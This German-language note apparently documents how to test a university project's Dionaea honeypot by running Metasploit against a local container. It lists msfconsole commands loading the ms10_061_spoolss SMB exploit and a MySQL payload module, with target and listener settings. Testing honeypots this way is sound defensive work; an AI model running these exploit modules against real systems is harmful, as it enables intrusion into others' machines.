Bezogen auf diesen Issue: https://git.informatik.uni-hamburg.de/iss/mp-ids/issues/132

Um die da beschriebene Sicherheitslücke zu testen, muss zunächst sichergestellt
werden, dass der Dionaea-Container den Port 445 nach außen hin exposed, damit
man da angreifen kann.

Dann Metasploit installieren. Die kostenlose Basisversion reicht dazu aus, bei
Arch Linux gibt's die im AuR.

Anschließend im Verzeichnis die `msfconsole` starten. Mit
`use windows/smb/ms10_061_spoolss` kann dann der Exploit geladen
werden. Danach die Optionen setzen:
`set RPORT 445`
`set PNAME XPSPrinter`
`set RHOST 127.0.01`
`set EXITFUNC process`
`set LHOST 172.17.0.2`
`set LPORT 4444`

Dann sollte alles bereit sein und man kann mit `exploit` den Angriff starten,
der nach ein paar Sekunden auch im CIM angezeigt werden sollte.


Ein weiterer Angriff, um MySQL zu testen, geht so: Man muss hier den Port 3306
exposen, ansonsten wie auch beim anderen die `msfconsole` starten. Dann
`use windows/mysql/mysql_payload`, `set RHOST 127.0.0.1`, `set LHOST 172.17.0.2`
und dann wieder `exploit`. Da kann man auch überprüfen, ob unsere Fehlermeldung
mittlerweile angepasst wurde (im Moment kommt immer noch die Dionaea-typische
`ServerError LearnSQL!`-Meldung). Der Angriff wird auch hier von Dionaea an das
CIM gemeldet. Allerdings wird er durch genannte Fehlermeldung vorzeitig
abgebrochen, ohne, dass ein Payload eingespeist werden kann.